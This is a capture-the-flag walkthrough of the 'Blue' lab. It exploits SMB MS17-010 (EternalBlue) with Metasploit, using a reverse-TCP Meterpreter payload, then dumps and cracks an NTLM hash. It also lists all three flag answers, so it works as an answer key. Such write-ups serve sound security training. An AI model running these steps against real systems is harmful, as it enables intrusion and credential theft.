# Blue

## Recon

##### #1 Scan the machine. (If you are unsure how to tackle this, I recommend checking out the room RP: Nmap)?
```
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
```

##### #2 How many ports are open with a port number under 1000?
There is 3 open ports.

##### #3 What is this machine vulnerable to?
Port 445 is open, check smb
```
nmap --script=smb* <ip>
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

## Run the exploit

##### #1 	Start Metasploit
```
msfconsole
```

##### #2 	Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
```
search ms17-010
exploit/windows/smb/ms17_010_eternalblue
```
##### #3 	Show options and set the one required value. What is the name of this value? (All caps for submission)
```
set RHOSTS 10.10.46.185
```
##### #4 	Run the exploit!
```
use exploit/windows/smb/ms17_010_eternalblue
run
```
##### #5 	Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 
Ok

## Priv esc

##### #1 	If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
```
post/multi/manage/shell_to_meterpreter
```

##### #2 	Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)
```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.46.185     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.100.167     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

##### #6 	Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

sessions -i 1

##### #7 	List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
 ```
 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 424   568   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 428   664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 476   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 484   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 568   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 616   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 624   608   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 664   608   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 712   616   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 720   616   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 728   616   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 836   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 904   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 952   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1080  1288  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1084  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1156  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 1288  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1336  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1404  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1480  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1620  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1948  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 2084  836   WmiPrvSE.exe                                                       
 2252  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           
 2736  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM           
 2864  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 2908  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 2944  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 3024  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM          
```

## Cracking

##### #1 	Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
Jon

##### #2 	Copy this password hash to a file and research how to crack it. What is the cracked password?
```
https://crackstation.net/
ffb43f0de35be4d9917ac0cc8ad57f8d	NTLM	alqfna22
```

alqfna22

## Get the flags

##### #1 	Flag1? (Only submit the flag contents {CONTENTS})
Just search for files that starts with flag
```
search -f flag*.*
c:\flag1.txt (24 bytes)
flag{access_the_machine}
```

##### #2 	Flag2? Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 
```
c:\Windows\System32\config\flag2.txt (34 bytes)
flag{sam_database_elevated_access}
```

##### #3 	flag3?
```
c:\Users\Jon\Documents\flag3.txt (37 bytes)
flag{admin_documents_can_be_valuable}
```
